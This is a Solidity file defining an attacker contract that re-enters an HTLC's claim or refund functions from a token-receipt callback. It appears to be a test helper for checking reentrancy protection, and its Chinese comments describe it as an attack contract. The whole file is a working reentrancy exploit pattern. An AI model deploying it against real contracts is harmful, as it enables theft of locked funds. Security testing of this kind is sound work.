// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {ReentrantERC20, IReceiver} from "./ReentrantERC20.sol";

interface IHtlc {
    function claim(bytes32 id, bytes32 preimage) external;

    function refund(bytes32 id) external;

    function lock(address receiver, address token, uint256 amount, bytes32 hashlock, uint256 timelock)
        external
        returns (bytes32);
}

/// @notice 攻击合约：作为收款方（claim 重入）或锁定方（refund 重入），
///         在收到代币的回调中重入 HTLC。
contract AttackerReceiver is IReceiver {
    IHtlc public htlc;
    ReentrantERC20 public token;
    bytes32 public targetId;
    bytes32 public preimage;

    enum Mode {
        OFF,
        CLAIM,
        REFUND
    }

    Mode public mode;
    uint256 public depth;
    uint256 public maxDepth = 1;

    function setMaxDepth(uint256 n) external {
        maxDepth = n;
    }

    function configure(address _htlc, address _token, bytes32 _targetId, bytes32 _preimage, Mode _mode) external {
        htlc = IHtlc(_htlc);
        token = ReentrantERC20(_token);
        targetId = _targetId;
        preimage = _preimage;
        mode = _mode;
        token.approve(address(htlc), type(uint256).max);
    }

    /// @dev refund 攻击准备：攻击者以自己为 sender 锁两笔，使合约持有两份资金。
    function seedTwoLocks(address receiver, uint256 amount, bytes32 hashlock, uint256 timelock)
        external
        returns (bytes32 id1, bytes32 id2)
    {
        id1 = htlc.lock(receiver, address(token), amount, hashlock, timelock);
        id2 = htlc.lock(receiver, address(token), amount, hashlock, timelock);
    }

    function startClaim() external {
        htlc.claim(targetId, preimage);
    }

    function startRefund() external {
        htlc.refund(targetId);
    }

    function tokensReceived(address, uint256) external override {
        if (mode == Mode.OFF || depth >= maxDepth) return;
        depth++;
        if (mode == Mode.CLAIM) {
            htlc.claim(targetId, preimage);
        } else {
            htlc.refund(targetId);
        }
        depth--;
    }
}
